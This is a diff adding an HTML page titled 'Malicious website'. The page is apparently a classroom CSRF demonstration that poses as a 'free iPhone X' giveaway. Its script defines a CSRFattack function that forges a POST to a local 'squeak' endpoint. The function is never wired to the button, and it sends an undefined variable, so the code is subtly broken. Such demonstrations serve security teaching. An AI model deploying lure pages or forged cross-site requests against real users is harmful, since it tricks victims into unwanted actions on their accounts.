@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, shrink-to-fit=no"
+    />
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="css/bootstrap.min.css" />
+
+    <title>Malicious website</title>
+  </head>
+  <body>
+    <div
+      class="container"
+      style="
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      "
+    >
+      <h1 class="display-4">Get The iPhone X for free!</h1>
+      <h3>Worth $999</h3>
+      <p>
+        A decade on and still innovating. With its super retina display, facial
+        recognition and wireless charging.
+      </p>
+      <p>Want to review the best iPhone yet for FREE?</p>
+      <button class="btn btn-info">Review now!</button>
+    </div>
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="js/jquery-3.3.1.slim.min.js"></script>
+    <script src="js/popper.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script>
+      function CSRFattack() {
+        let body = new URLSearchParams();
+        body.append("squeak", "test@gmail.com");
+        fetch("https://localhost/squeak", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+          },
+          body: JSON.stringify(data),
+        });
+      }
+    </script>
+  </body>
+</html>
